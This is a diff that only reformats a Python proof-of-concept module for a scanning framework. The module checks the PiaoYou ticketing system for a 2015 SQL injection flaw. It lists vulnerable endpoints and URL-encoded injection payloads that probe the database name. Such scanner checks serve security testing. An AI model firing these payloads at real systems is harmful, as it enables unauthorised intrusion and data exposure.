@@ -2,13 +2,14 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re 
+import re
+
 
 class Vuln(ABVuln):
-    vuln_id = 'PiaoYou_0001' # 平台漏洞编号，留空
+    vuln_id = 'PiaoYou_0001'  # 平台漏洞编号，留空
     name = '票友售票系统 通用型SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-03-13'  # 漏洞公布时间
     desc = '''
         票友售票系统存在多处SQL注入漏洞：
@@ -27,6 +28,7 @@ class Vuln(ABVuln):
     product = 'PiaoYou(票友软件)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '2f9f99cd-b0f2-498f-9aff-634822c2783d'
     author = '47bwy'  # POC编写者
@@ -39,15 +41,15 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101090
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101091
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101092
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101093
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101102
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101103
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101104
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0101106
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101090
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101091
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101092
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101093
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101102
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101103
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101104
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0101106
             payload1 = [
                 '/json_db/other_report.aspx?its=3&jq=0&stype=&dfs=0&levels=111',
                 '/json_db/flight_return.aspx?sdate=2015-03-13&edate=2015-03-13&cp=11111',
@@ -61,7 +63,7 @@ class Poc(ABPoc):
             payload2 = '%27%20and%20db_name%281%29%3E1%20or%20%271%27%3D%272'
             payload3 = '%28%20select%20db_name%281%29%29'
             for payload in payload1:
-                match1 = re.search('info',payload)
+                match1 = re.search('info', payload)
                 if match1:
                     verify_url = self.target + payload + payload3
                 else:
@@ -80,6 +82,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
